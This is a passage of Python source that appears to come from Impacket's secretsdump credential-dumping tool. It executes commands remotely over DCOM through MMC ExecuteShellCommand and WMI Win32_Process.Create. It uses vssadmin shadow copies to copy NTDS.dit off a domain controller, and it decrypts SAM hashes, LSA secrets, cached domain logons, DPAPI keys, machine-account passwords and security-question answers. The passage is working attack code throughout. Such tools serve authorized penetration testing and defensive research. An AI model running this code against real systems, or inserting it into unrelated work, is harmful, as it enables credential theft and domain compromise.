            logging.error("Unknown OBJREF Type! 0x%x" % objRefType)

        return IRemUnknown2(
            INTERFACE(interface.get_cinstance(), None, interface.get_ipidRemUnknown(), objRef['std']['ipid'],
                      oxid=objRef['std']['oxid'], oid=objRef['std']['oxid'],
                      target=interface.get_target()))

    def __mmcExec(self,command):
        command = command.replace('%COMSPEC%', 'c:\\windows\\system32\\cmd.exe')
        username, password, domain, lmhash, nthash, aesKey, _, _ = self.__smbConnection.getCredentials()
        dcom = DCOMConnection(self.__smbConnection.getRemoteHost(), username, password, domain, lmhash, nthash, aesKey,
                              oxidResolver=False, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        iInterface = dcom.CoCreateInstanceEx(string_to_bin('49B2791A-B1AE-4C90-9B8E-E860BA07F889'), IID_IDispatch)
        iMMC = IDispatch(iInterface)

        resp = iMMC.GetIDsOfNames(('Document',))

        dispParams = DISPPARAMS(None, False)
        dispParams['rgvarg'] = NULL
        dispParams['rgdispidNamedArgs'] = NULL
        dispParams['cArgs'] = 0
        dispParams['cNamedArgs'] = 0
        resp = iMMC.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])

        iDocument = IDispatch(self.__getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
        resp = iDocument.GetIDsOfNames(('ActiveView',))
        resp = iDocument.Invoke(resp[0], 0x409, DISPATCH_PROPERTYGET, dispParams, 0, [], [])

        iActiveView = IDispatch(self.__getInterface(iMMC, resp['pVarResult']['_varUnion']['pdispVal']['abData']))
        pExecuteShellCommand = iActiveView.GetIDsOfNames(('ExecuteShellCommand',))[0]

        pQuit = iMMC.GetIDsOfNames(('Quit',))[0]

        dispParams = DISPPARAMS(None, False)
        dispParams['rgdispidNamedArgs'] = NULL
        dispParams['cArgs'] = 4
        dispParams['cNamedArgs'] = 0
        arg0 = VARIANT(None, False)
        arg0['clSize'] = 5
        arg0['vt'] = VARENUM.VT_BSTR
        arg0['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg0['_varUnion']['bstrVal']['asData'] = 'c:\\windows\\system32\\cmd.exe'

        arg1 = VARIANT(None, False)
        arg1['clSize'] = 5
        arg1['vt'] = VARENUM.VT_BSTR
        arg1['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg1['_varUnion']['bstrVal']['asData'] = 'c:\\'

        arg2 = VARIANT(None, False)
        arg2['clSize'] = 5
        arg2['vt'] = VARENUM.VT_BSTR
        arg2['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg2['_varUnion']['bstrVal']['asData'] = command[len('c:\\windows\\system32\\cmd.exe'):]

        arg3 = VARIANT(None, False)
        arg3['clSize'] = 5
        arg3['vt'] = VARENUM.VT_BSTR
        arg3['_varUnion']['tag'] = VARENUM.VT_BSTR
        arg3['_varUnion']['bstrVal']['asData'] = '7'
        dispParams['rgvarg'].append(arg3)
        dispParams['rgvarg'].append(arg2)
        dispParams['rgvarg'].append(arg1)
        dispParams['rgvarg'].append(arg0)

        iActiveView.Invoke(pExecuteShellCommand, 0x409, DISPATCH_METHOD, dispParams, 0, [], [])

        dispParams = DISPPARAMS(None, False)
        dispParams['rgvarg'] = NULL
        dispParams['rgdispidNamedArgs'] = NULL
        dispParams['cArgs'] = 0
        dispParams['cNamedArgs'] = 0

        iMMC.Invoke(pQuit, 0x409, DISPATCH_METHOD, dispParams, 0, [], [])


    def __wmiExec(self, command):
        # Convert command to wmi exec friendly format
        command = command.replace('%COMSPEC%', 'cmd.exe')
        username, password, domain, lmhash, nthash, aesKey, _, _ = self.__smbConnection.getCredentials()
        dcom = DCOMConnection(self.__smbConnection.getRemoteHost(), username, password, domain, lmhash, nthash, aesKey,
                              oxidResolver=False, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
        iWbemLevel1Login.RemRelease()

        win32Process,_ = iWbemServices.GetObject('Win32_Process')
        win32Process.Create(command, '\\', None)

        dcom.disconnect()

    def __executeRemote(self, data):
        self.__tmpServiceName = ''.join([random.choice(string.ascii_letters) for _ in range(8)])
        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' > ' + self.__batchFile + ' & ' + \
                  self.__shell + self.__batchFile
        command += ' & ' + 'del ' + self.__batchFile

        LOG.debug('ExecuteRemote command: %s' % command)
        if self.__execMethod == 'smbexec':
            self.__smbExec(command)
        elif self.__execMethod == 'wmiexec':
            self.__wmiExec(command)
        elif self.__execMethod == 'mmcexec':
            self.__mmcExec(command)
        else:
            raise Exception('Invalid exec method %s, aborting' % self.__execMethod)


    def __answer(self, data):
        self.__answerTMP += data

    def __getLastVSS(self, forDrive=None):
        if forDrive:
            command = '%COMSPEC% /C vssadmin list shadows /for=' + forDrive
        else:
            command = '%COMSPEC% /C vssadmin list shadows'
        self.__executeRemote(command)
        time.sleep(5)
        tries = 0
        while True:
            try:
                self.__smbConnection.getFile('ADMIN$', 'Temp\\__output', self.__answer)
                break
            except Exception as e:
                if tries > 30:
                    # We give up
                    raise Exception('Too many tries trying to list vss shadows')
                if str(e).find('SHARING') > 0:
                    # Stuff didn't finish yet.. wait more
                    time.sleep(5)
                    tries +=1
                    pass
                else:
                    raise

        lines = self.__answerTMP.split(b'\n')
        lastShadow = b''
        lastShadowFor = b''
        lastShadowId = b''

        # Let's find the last one
        # The string used to search the shadow for drive. Wondering what happens
        # in other languages
        SHADOWFOR = b'Volume: ('
        IDSTART = b'Shadow Copy ID: {'
        IDLEN=len('3547017b-0ac9-478b-88e6-f9be7e1c11999')

        for line in lines:
           if line.find(b'GLOBALROOT') > 0:
               lastShadow = line[line.find(b'\\\\?'):][:-1]
           elif line.find(SHADOWFOR) > 0:
               lastShadowFor = line[line.find(SHADOWFOR)+len(SHADOWFOR):][:2]
           elif line.find(IDSTART) > 0:
               lastShadowId = line[line.find(IDSTART)+len(IDSTART):][:IDLEN-1]

        self.__smbConnection.deleteFile('ADMIN$', 'Temp\\__output')

        LOG.debug('__getLastVSS found last VSS %s on %s with ID of %s' % (lastShadow.decode('utf-8'), lastShadowFor.decode('utf-8'), lastShadowId.decode('utf-8')))

        return lastShadow.decode('utf-8'), lastShadowFor.decode('utf-8'), lastShadowId.decode('utf-8')

    def saveNTDS(self):
        LOG.info('Searching for NTDS.dit')
        # First of all, let's try to read the target NTDS.dit registry entry
        ans = rrp.hOpenLocalMachine(self.__rrp)
        regHandle = ans['phKey']
        try:
            ans = rrp.hBaseRegOpenKey(self.__rrp, self.__regHandle, 'SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters')
            keyHandle = ans['phkResult']
        except:
            # Can't open the registry path, assuming no NTDS on the other end
            return None

        try:
            dataType, dataValue = rrp.hBaseRegQueryValue(self.__rrp, keyHandle, 'DSA Database file')
            ntdsLocation = dataValue[:-1]
            ntdsDrive = ntdsLocation[:2]
        except:
            # Can't open the registry path, assuming no NTDS on the other end
            return None

        rrp.hBaseRegCloseKey(self.__rrp, keyHandle)
        rrp.hBaseRegCloseKey(self.__rrp, regHandle)

        LOG.info('Registry says NTDS.dit is at %s. Calling vssadmin to get a copy. This might take some time' % ntdsLocation)
        LOG.info('Using %s method for remote execution' % self.__execMethod)
        # Get the list of remote shadows
        shadow, shadowFor, shadowId = self.__getLastVSS(forDrive=ntdsDrive)
        if shadow == '' or (shadow != '' and shadowFor != ntdsDrive):
            # No shadow, create one
            self.__executeRemote('%%COMSPEC%% /C vssadmin create shadow /For=%s' % ntdsDrive)
            shadow, shadowFor, shadowId = self.__getLastVSS(forDrive=ntdsDrive)
            shouldRemove = True
            if shadow == '' or shadowFor != ntdsDrive:
                raise Exception('Could not get a VSS')
        else:
            # There was already a shadow, let's not delete this
            shouldRemove = False

        # Now copy the ntds.dit to the temp directory
        tmpFileName = ''.join([random.choice(string.ascii_letters) for _ in range(8)]) + '.tmp'

        self.__executeRemote('%%COMSPEC%% /C copy %s%s %%SYSTEMROOT%%\\Temp\\%s' % (shadow, ntdsLocation[2:], tmpFileName))

        if shouldRemove is True:
            LOG.debug('Trying to delete shadow copy using command : %%COMSPEC%% /C vssadmin delete shadows /shadow="{%s}" /Quiet' % shadowId)
            self.__executeRemote('%%COMSPEC%% /C vssadmin delete shadows /shadow="{%s}" /Quiet' % shadowId)


        tries = 0
        while True:
            try:
                self.__smbConnection.deleteFile('ADMIN$', 'Temp\\__output')
                break
            except Exception as e:
                if tries >= 30:
                    raise e
                if str(e).find('STATUS_OBJECT_NAME_NOT_FOUND') >= 0 or str(e).find('STATUS_SHARING_VIOLATION') >=0:
                    tries += 1
                    time.sleep(5)
                    pass
                else:
                    logging.error('Cannot delete target file \\\\%s\\ADMIN$\\Temp\\__output: %s' % (self.__smbConnection.getRemoteHost(), str(e)))
                    pass

        remoteFileName = RemoteFile(self.__smbConnection, 'Temp\\%s' % tmpFileName)

        return remoteFileName

class CryptoCommon:
    # Common crypto stuff used over different classes
    def deriveKey(self, baseKey):
        # 2.2.11.1.3 Deriving Key1 and Key2 from a Little-Endian, Unsigned Integer Key
        # Let I be the little-endian, unsigned integer.
        # Let I[X] be the Xth byte of I, where I is interpreted as a zero-base-index array of bytes.
        # Note that because I is in little-endian byte order, I[0] is the least significant byte.
        # Key1 is a concatenation of the following values: I[0], I[1], I[2], I[3], I[0], I[1], I[2].
        # Key2 is a concatenation of the following values: I[3], I[0], I[1], I[2], I[3], I[0], I[1]
        key = pack('<L',baseKey)
        key1 = [key[0] , key[1] , key[2] , key[3] , key[0] , key[1] , key[2]]
        key2 = [key[3] , key[0] , key[1] , key[2] , key[3] , key[0] , key[1]]
        if PY2:
            return transformKey(b''.join(key1)),transformKey(b''.join(key2))
        else:
            return transformKey(bytes(key1)),transformKey(bytes(key2))

    @staticmethod
    def decryptAES(key, value, iv=b'\x00'*16):
        plainText = b''
        if iv != b'\x00'*16:
            aes256 = AES.new(key,AES.MODE_CBC, iv)

        for index in range(0, len(value), 16):
            if iv == b'\x00'*16:
                aes256 = AES.new(key,AES.MODE_CBC, iv)
            cipherBuffer = value[index:index+16]
            # Pad buffer to 16 bytes
            if len(cipherBuffer) < 16:
                cipherBuffer += b'\x00' * (16-len(cipherBuffer))
            plainText += aes256.decrypt(cipherBuffer)

        return plainText


class OfflineRegistry:
    def __init__(self, hiveFile = None, isRemote = False):
        self.__hiveFile = hiveFile
        if self.__hiveFile is not None:
            self.__registryHive = winregistry.Registry(self.__hiveFile, isRemote)

    def enumKey(self, searchKey):
        parentKey = self.__registryHive.findKey(searchKey)

        if parentKey is None:
            return

        keys = self.__registryHive.enumKey(parentKey)

        return keys

    def enumValues(self, searchKey):
        key = self.__registryHive.findKey(searchKey)

        if key is None:
            return

        values = self.__registryHive.enumValues(key)

        return values

    def getValue(self, keyValue):
        value = self.__registryHive.getValue(keyValue)

        if value is None:
            return

        return value

    def getClass(self, className):
        value = self.__registryHive.getClass(className)

        if value is None:
            return

        return value

    def finish(self):
        if self.__hiveFile is not None:
            # Remove temp file and whatever else is needed
            self.__registryHive.close()

class SAMHashes(OfflineRegistry):
    def __init__(self, samFile, bootKey, isRemote = False, perSecretCallback = lambda secret: _print_helper(secret)):
        OfflineRegistry.__init__(self, samFile, isRemote)
        self.__samFile = samFile
        self.__hashedBootKey = b''
        self.__bootKey = bootKey
        self.__cryptoCommon = CryptoCommon()
        self.__itemsFound = {}
        self.__perSecretCallback = perSecretCallback

    def MD5(self, data):
        md5 = hashlib.new('md5')
        md5.update(data)
        return md5.digest()

    def getHBootKey(self):
        LOG.debug('Calculating HashedBootKey from SAM')
        QWERTY = b"!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\0"
        DIGITS = b"0123456789012345678901234567890123456789\0"

        F = self.getValue(ntpath.join(r'SAM\Domains\Account','F'))[1]

        domainData = DOMAIN_ACCOUNT_F(F)

        if domainData['Key0'][0:1] == b'\x01':
            samKeyData = SAM_KEY_DATA(domainData['Key0'])

            rc4Key = self.MD5(samKeyData['Salt'] + QWERTY + self.__bootKey + DIGITS)
            rc4 = ARC4.new(rc4Key)
            self.__hashedBootKey = rc4.encrypt(samKeyData['Key']+samKeyData['CheckSum'])

            # Verify key with checksum
            checkSum = self.MD5( self.__hashedBootKey[:16] + DIGITS + self.__hashedBootKey[:16] + QWERTY)

            if checkSum != self.__hashedBootKey[16:]:
                raise Exception('hashedBootKey CheckSum failed, Syskey startup password probably in use! :(')

        elif domainData['Key0'][0:1] == b'\x02':
            # This is Windows 2016 TP5 on in theory (it is reported that some W10 and 2012R2 might behave this way also)
            samKeyData = SAM_KEY_DATA_AES(domainData['Key0'])

            self.__hashedBootKey = self.__cryptoCommon.decryptAES(self.__bootKey,
                                                                  samKeyData['Data'][:samKeyData['DataLen']], samKeyData['Salt'])

    def __decryptHash(self, rid, cryptedHash, constant, newStyle = False):
        # Section 2.2.11.1.1 Encrypting an NT or LM Hash Value with a Specified Key
        # plus hashedBootKey stuff
        Key1,Key2 = self.__cryptoCommon.deriveKey(rid)

        Crypt1 = DES.new(Key1, DES.MODE_ECB)
        Crypt2 = DES.new(Key2, DES.MODE_ECB)

        if newStyle is False:
            rc4Key = self.MD5( self.__hashedBootKey[:0x10] + pack("<L",rid) + constant )
            rc4 = ARC4.new(rc4Key)
            key = rc4.encrypt(cryptedHash['Hash'])
        else:
            key = self.__cryptoCommon.decryptAES(self.__hashedBootKey[:0x10], cryptedHash['Hash'], cryptedHash['Salt'])[:16]

        decryptedHash = Crypt1.decrypt(key[:8]) + Crypt2.decrypt(key[8:])

        return decryptedHash

    def dump(self):
        NTPASSWORD = b"NTPASSWORD\0"
        LMPASSWORD = b"LMPASSWORD\0"

        if self.__samFile is None:
            # No SAM file provided
            return

        LOG.info('Dumping local SAM hashes (uid:rid:lmhash:nthash)')
        self.getHBootKey()

        usersKey = 'SAM\\Domains\\Account\\Users'

        # Enumerate all the RIDs
        rids = self.enumKey(usersKey)
        # Remove the Names item
        try:
            rids.remove('Names')
        except:
            pass

        for rid in rids:
            userAccount = USER_ACCOUNT_V(self.getValue(ntpath.join(usersKey,rid,'V'))[1])
            rid = int(rid,16)

            V = userAccount['Data']

            userName = V[userAccount['NameOffset']:userAccount['NameOffset']+userAccount['NameLength']].decode('utf-16le')

            if userAccount['NTHashLength'] == 0:
                logging.error('SAM hashes extraction for user %s failed. The account doesn\'t have hash information.' % userName)
                continue

            encNTHash = b''
            if V[userAccount['NTHashOffset']:][2:3] == b'\x01':
                # Old Style hashes
                newStyle = False
                if userAccount['LMHashLength'] == 20:
                    encLMHash = SAM_HASH(V[userAccount['LMHashOffset']:][:userAccount['LMHashLength']])
                if userAccount['NTHashLength'] == 20:
                    encNTHash = SAM_HASH(V[userAccount['NTHashOffset']:][:userAccount['NTHashLength']])
            else:
                # New Style hashes
                newStyle = True
                if userAccount['LMHashLength'] == 24:
                    encLMHash = SAM_HASH_AES(V[userAccount['LMHashOffset']:][:userAccount['LMHashLength']])
                encNTHash = SAM_HASH_AES(V[userAccount['NTHashOffset']:][:userAccount['NTHashLength']])

            LOG.debug('NewStyle hashes is: %s' % newStyle)
            if userAccount['LMHashLength'] >= 20:
                lmHash = self.__decryptHash(rid, encLMHash, LMPASSWORD, newStyle)
            else:
                lmHash = b''

            if encNTHash != b'':
                ntHash = self.__decryptHash(rid, encNTHash, NTPASSWORD, newStyle)
            else:
                ntHash = b''

            if lmHash == b'':
                lmHash = ntlm.LMOWFv1('','')
            if ntHash == b'':
                ntHash = ntlm.NTOWFv1('','')

            answer =  "%s:%d:%s:%s:::" % (userName, rid, hexlify(lmHash).decode('utf-8'), hexlify(ntHash).decode('utf-8'))
            self.__itemsFound[rid] = answer
            self.__perSecretCallback(answer)

    def export(self, baseFileName, openFileFunc = None):
        if len(self.__itemsFound) > 0:
            items = sorted(self.__itemsFound)
            fileName = baseFileName+'.sam'
            fd = openFile(fileName, openFileFunc=openFileFunc)
            for item in items:
                fd.write(self.__itemsFound[item]+'\n')
            fd.close()
            return fileName

class LSASecrets(OfflineRegistry):
    UNKNOWN_USER = '(Unknown User)'
    class SECRET_TYPE:
        LSA = 0
        LSA_HASHED = 1
        LSA_RAW = 2
        LSA_KERBEROS = 3

    def __init__(self, securityFile, bootKey, remoteOps=None, isRemote=False, history=False,
                 perSecretCallback=lambda secretType, secret: _print_helper(secret)):
        OfflineRegistry.__init__(self, securityFile, isRemote)
        self.__hashedBootKey = b''
        self.__bootKey = bootKey
        self.__LSAKey = b''
        self.__NKLMKey = b''
        self.__vistaStyle = True
        self.__cryptoCommon = CryptoCommon()
        self.__securityFile = securityFile
        self.__remoteOps = remoteOps
        self.__cachedItems = []
        self.__secretItems = []
        self.__perSecretCallback = perSecretCallback
        self.__history = history

    def MD5(self, data):
        md5 = hashlib.new('md5')
        md5.update(data)
        return md5.digest()

    def __sha256(self, key, value, rounds=1000):
        sha = hashlib.sha256()
        sha.update(key)
        for i in range(1000):
            sha.update(value)
        return sha.digest()

    def __decryptSecret(self, key, value):
        # [MS-LSAD] Section 5.1.2
        plainText = b''

        encryptedSecretSize = unpack('<I', value[:4])[0]
        value = value[len(value)-encryptedSecretSize:]

        key0 = key
        for i in range(0, len(value), 8):
            cipherText = value[:8]
            tmpStrKey = key0[:7]
            tmpKey = transformKey(tmpStrKey)
            Crypt1 = DES.new(tmpKey, DES.MODE_ECB)
            plainText += Crypt1.decrypt(cipherText)
            key0 = key0[7:]
            value = value[8:]
            # AdvanceKey
            if len(key0) < 7:
                key0 = key[len(key0):]

        secret = LSA_SECRET_XP(plainText)
        return secret['Secret']

    def __decryptHash(self, key, value, iv):
        hmac_md5 = HMAC.new(key,iv,MD5)
        rc4key = hmac_md5.digest()

        rc4 = ARC4.new(rc4key)
        data = rc4.encrypt(value)
        return data

    def __decryptLSA(self, value):
        if self.__vistaStyle is True:
            # ToDo: There could be more than one LSA Keys
            record = LSA_SECRET(value)
            tmpKey = self.__sha256(self.__bootKey, record['EncryptedData'][:32])
            plainText = self.__cryptoCommon.decryptAES(tmpKey, record['EncryptedData'][32:])
            record = LSA_SECRET_BLOB(plainText)
            self.__LSAKey = record['Secret'][52:][:32]

        else:
            md5 = hashlib.new('md5')
            md5.update(self.__bootKey)
            for i in range(1000):
                md5.update(value[60:76])
            tmpKey = md5.digest()
            rc4 = ARC4.new(tmpKey)
            plainText = rc4.decrypt(value[12:60])
            self.__LSAKey = plainText[0x10:0x20]

    def __getLSASecretKey(self):
        LOG.debug('Decrypting LSA Key')
        # Let's try the key post XP
        value = self.getValue('\\Policy\\PolEKList\\default')
        if value is None:
            LOG.debug('PolEKList not found, trying PolSecretEncryptionKey')
            # Second chance
            value = self.getValue('\\Policy\\PolSecretEncryptionKey\\default')
            self.__vistaStyle = False
            if value is None:
                # No way :(
                return None

        self.__decryptLSA(value[1])

    def __getNLKMSecret(self):
        LOG.debug('Decrypting NL$KM')
        value = self.getValue('\\Policy\\Secrets\\NL$KM\\CurrVal\\default')
        if value is None:
            raise Exception("Couldn't get NL$KM value")
        if self.__vistaStyle is True:
            record = LSA_SECRET(value[1])
            tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
            self.__NKLMKey = self.__cryptoCommon.decryptAES(tmpKey, record['EncryptedData'][32:])
        else:
            self.__NKLMKey = self.__decryptSecret(self.__LSAKey, value[1])

    def __pad(self, data):
        if (data & 0x3) > 0:
            return data + (data & 0x3)
        else:
            return data

    def dumpCachedHashes(self):
        if self.__securityFile is None:
            # No SECURITY file provided
            return

        LOG.info('Dumping cached domain logon information (domain/username:hash)')

        # Let's first see if there are cached entries
        values = self.enumValues('\\Cache')
        if values is None:
            # No cache entries
            return
        try:
            # Remove unnecessary value
            values.remove(b'NL$Control')
        except:
            pass

        iterationCount = 10240

        if b'NL$IterationCount' in values:
            values.remove(b'NL$IterationCount')

            record = self.getValue('\\Cache\\NL$IterationCount')[1]
            if record > 10240:
                iterationCount = record & 0xfffffc00
            else:
                iterationCount = record * 1024

        self.__getLSASecretKey()
        self.__getNLKMSecret()

        for value in values:
            LOG.debug('Looking into %s' % value.decode('utf-8'))
            record = NL_RECORD(self.getValue(ntpath.join('\\Cache',value.decode('utf-8')))[1])
            if record['IV'] != 16 * b'\x00':
            #if record['UserLength'] > 0:
                if record['Flags'] & 1 == 1:
                    # Encrypted
                    if self.__vistaStyle is True:
                        plainText = self.__cryptoCommon.decryptAES(self.__NKLMKey[16:32], record['EncryptedData'], record['IV'])
                    else:
                        plainText = self.__decryptHash(self.__NKLMKey, record['EncryptedData'], record['IV'])
                        pass
                else:
                    # Plain! Until we figure out what this is, we skip it
                    #plainText = record['EncryptedData']
                    continue
                encHash = plainText[:0x10]
                plainText = plainText[0x48:]
                userName = plainText[:record['UserLength']].decode('utf-16le')
                plainText = plainText[self.__pad(record['UserLength']) + self.__pad(record['DomainNameLength']):]
                domainLong = plainText[:self.__pad(record['DnsDomainNameLength'])].decode('utf-16le')

                if self.__vistaStyle is True:
                    answer = "%s/%s:$DCC2$%s#%s#%s" % (domainLong, userName, iterationCount, userName, hexlify(encHash).decode('utf-8'))
                else:
                    answer = "%s/%s:%s:%s" % (domainLong, userName, hexlify(encHash).decode('utf-8'), userName)

                self.__cachedItems.append(answer)
                self.__perSecretCallback(LSASecrets.SECRET_TYPE.LSA_HASHED, answer)

    def __printSecret(self, name, secretItem):
        # Based on [MS-LSAD] section 3.1.1.4

        # First off, let's discard NULL secrets.
        if len(secretItem) == 0:
            LOG.debug('Discarding secret %s, NULL Data' % name)
            return

        # We might have secrets with zero
        if secretItem.startswith(b'\x00\x00'):
            LOG.debug('Discarding secret %s, all zeros' % name)
            return

        upperName = name.upper()

        LOG.info('%s ' % name)

        secret = ''

        if upperName.startswith('_SC_'):
            # Service name, a password might be there
            # Let's first try to decode the secret
            try:
                strDecoded = secretItem.decode('utf-16le')
            except:
                pass
            else:
                # We have to get the account the service
                # runs under
                if hasattr(self.__remoteOps, 'getServiceAccount'):
                    account = self.__remoteOps.getServiceAccount(name[4:])
                    if account is None:
                        secret = self.UNKNOWN_USER + ':'
                    else:
                        secret =  "%s:" % account
                else:
                    # We don't support getting this info for local targets at the moment
                    secret = self.UNKNOWN_USER + ':'
                secret += strDecoded
        elif upperName.startswith('DEFAULTPASSWORD'):
            # defaults password for winlogon
            # Let's first try to decode the secret
            try:
                strDecoded = secretItem.decode('utf-16le')
            except:
                pass
            else:
                # We have to get the account this password is for
                if hasattr(self.__remoteOps, 'getDefaultLoginAccount'):
                    account = self.__remoteOps.getDefaultLoginAccount()
                    if account is None:
                        secret = self.UNKNOWN_USER + ':'
                    else:
                        secret = "%s:" % account
                else:
                    # We don't support getting this info for local targets at the moment
                    secret = self.UNKNOWN_USER + ':'
                secret += strDecoded
        elif upperName.startswith('ASPNET_WP_PASSWORD'):
            try:
                strDecoded = secretItem.decode('utf-16le')
            except:
                pass
            else:
                secret = 'ASPNET: %s' % strDecoded
        elif upperName.startswith('DPAPI_SYSTEM'):
            # Decode the DPAPI Secrets
            dpapi = DPAPI_SYSTEM(secretItem)
            secret = "dpapi_machinekey:0x{0}\ndpapi_userkey:0x{1}".format( hexlify(dpapi['MachineKey']).decode('latin-1'),
                                                               hexlify(dpapi['UserKey']).decode('latin-1'))
        elif upperName.startswith('$MACHINE.ACC'):
            # compute MD4 of the secret.. yes.. that is the nthash? :-o
            md4 = MD4.new()
            md4.update(secretItem)
            if hasattr(self.__remoteOps, 'getMachineNameAndDomain'):
                machine, domain = self.__remoteOps.getMachineNameAndDomain()
                printname = "%s\\%s$" % (domain, machine)
                secret = "%s\\%s$:%s:%s:::" % (domain, machine, hexlify(ntlm.LMOWFv1('','')).decode('utf-8'),
                                               hexlify(md4.digest()).decode('utf-8'))
            else:
                printname = "$MACHINE.ACC"
                secret = "$MACHINE.ACC: %s:%s" % (hexlify(ntlm.LMOWFv1('','')).decode('utf-8'),
                                                  hexlify(md4.digest()).decode('utf-8'))
            # Attempt to calculate and print Kerberos keys
            if not self.__printMachineKerberos(secretItem, printname):
                LOG.debug('Could not calculate machine account Kerberos keys, only printing plain password (hex encoded)')
            # Always print plaintext anyway since this may be needed for some popular usecases
            extrasecret = "%s:plain_password_hex:%s" % (printname, hexlify(secretItem).decode('utf-8'))
            self.__secretItems.append(extrasecret)
            self.__perSecretCallback(LSASecrets.SECRET_TYPE.LSA, extrasecret)
        elif re.match('^L\$_SQSA_(S-[0-9]-[0-9]-([0-9])+-([0-9])+-([0-9])+-([0-9])+-([0-9])+)$', upperName) is not None:
            # Decode stored security questions
            sid = re.search('^L\$_SQSA_(S-[0-9]-[0-9]-([0-9])+-([0-9])+-([0-9])+-([0-9])+-([0-9])+)$', upperName).group(1)
            try:
                strDecoded = secretItem.decode('utf-16le').replace('\xa0',' ')
                strDecoded = json.loads(strDecoded)
            except:
                pass
            else:
                output = []
                if strDecoded['version'] == 1:
                    output.append(" - Version : %d" % strDecoded['version'])
                    for qk in strDecoded['questions']:
                        output.append(" | Question: %s" % qk['question'])
                        output.append(" | |--> Answer: %s" % qk['answer'])
                    output = '\n'.join(output)
                    secret = 'Security Questions for user %s: \n%s' % (sid, output)
                else:
                    LOG.warning("Unknown SQSA version (%s), please open an issue with the following data so we can add a parser for it." % str(strDecoded['version']))
                    LOG.warning("Don't forget to remove sensitive content before sending the data in a Github issue.")
                    secret = json.dumps(strDecoded, indent=4)

        if secret != '':
            printableSecret = secret
            self.__secretItems.append(secret)
            self.__perSecretCallback(LSASecrets.SECRET_TYPE.LSA, printableSecret)
        else:
            # Default print, hexdump
            printableSecret  = '%s:%s' % (name, hexlify(secretItem).decode('utf-8'))
            self.__secretItems.append(printableSecret)
            # If we're using the default callback (ourselves), we print the hex representation. If not, the
            # user will need to decide what to do.
            if self.__module__ == self.__perSecretCallback.__module__:
                hexdump(secretItem)
            self.__perSecretCallback(LSASecrets.SECRET_TYPE.LSA_RAW, printableSecret)

    def __printMachineKerberos(self, rawsecret, machinename):
        # Attempt to create Kerberos keys from machine account (if possible)
        if hasattr(self.__remoteOps, 'getMachineKerberosSalt'):
            salt = self.__remoteOps.getMachineKerberosSalt()
            if salt == b'':
                return False
            else:
                allciphers = [
                    int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
                    int(constants.EncryptionTypes.des_cbc_md5.value)
                ]
                # Ok, so the machine account password is in raw UTF-16, BUT can contain any amount
                # of invalid unicode characters.
                # This took me (Dirk-jan) way too long to figure out, but apparently Microsoft
                # implicitly replaces those when converting utf-16 to utf-8.
                # When we use the same method we get the valid password -> key mapping :)
                rawsecret = rawsecret.decode('utf-16-le', 'replace').encode('utf-8', 'replace')
                for etype in allciphers:
                    try:
                        key = string_to_key(etype, rawsecret, salt, None)
                    except Exception:
                        LOG.debug('Exception', exc_info=True)
                        raise
                    typename = NTDSHashes.KERBEROS_TYPE[etype]
                    secret = "%s:%s:%s" % (machinename, typename, hexlify(key.contents).decode('utf-8'))
                    self.__secretItems.append(secret)
                    self.__perSecretCallback(LSASecrets.SECRET_TYPE.LSA_KERBEROS, secret)
                return True
        else:
            return False

    def dumpSecrets(self):
        if self.__securityFile is None:
            # No SECURITY file provided
            return

        LOG.info('Dumping LSA Secrets')

        # Let's first see if there are cached entries
        keys = self.enumKey('\\Policy\\Secrets')
        if keys is None:
            # No entries
            return
        try:
            # Remove unnecessary value
            keys.remove(b'NL$Control')
        except:
            pass

        if self.__LSAKey == b'':
            self.__getLSASecretKey()

        for key in keys:
            LOG.debug('Looking into %s' % key)
            valueTypeList = ['CurrVal']
            # Check if old LSA secrets values are also need to be shown
            if self.__history:
                valueTypeList.append('OldVal')

            for valueType in valueTypeList:
                value = self.getValue('\\Policy\\Secrets\\{}\\{}\\default'.format(key,valueType))
                if value is not None and value[1] != 0:
                    if self.__vistaStyle is True:
                        record = LSA_SECRET(value[1])
                        tmpKey = self.__sha256(self.__LSAKey, record['EncryptedData'][:32])
                        plainText = self.__cryptoCommon.decryptAES(tmpKey, record['EncryptedData'][32:])
                        record = LSA_SECRET_BLOB(plainText)
                        secret = record['Secret']
                    else:
                        secret = self.__decryptSecret(self.__LSAKey, value[1])

                    # If this is an OldVal secret, let's append '_history' to be able to distinguish it and
                    # also be consistent with NTDS history
                    if valueType == 'OldVal':
                        key += '_history'
                    self.__printSecret(key, secret)

    def exportSecrets(self, baseFileName, openFileFunc = None):
        if len(self.__secretItems) > 0:
            fileName = baseFileName+'.secrets'
            fd = openFile(fileName, openFileFunc=openFileFunc)
            for item in self.__secretItems:
                fd.write(item+'\n')
            fd.close()
            return fileName

    def exportCached(self, baseFileName, openFileFunc = None):
        if len(self.__cachedItems) > 0:
            fileName = baseFileName+'.cached'
            fd = openFile(fileName, openFileFunc=openFileFunc)
            for item in self.__cachedItems:
                fd.write(item+'\n')
            fd.close()
            return fileName


class ResumeSessionMgrInFile(object):
    def __init__(self, resumeFileName=None):
        self.__resumeFileName = resumeFileName
        self.__resumeFile = None
        self.__hasResumeData = resumeFileName is not None

    def hasResumeData(self):
        return self.__hasResumeData

    def clearResumeData(self):
        self.endTransaction()
        if self.__resumeFileName and os.path.isfile(self.__resumeFileName):
            os.remove(self.__resumeFileName)

    def writeResumeData(self, data):
        # self.beginTransaction() must be called first, but we are aware of performance here, so we avoid checking that
        self.__resumeFile.seek(0, 0)
        self.__resumeFile.truncate(0)
        self.__resumeFile.write(data.encode())
        self.__resumeFile.flush()

    def getResumeData(self):
        try:
            self.__resumeFile = open(self.__resumeFileName,'rb')
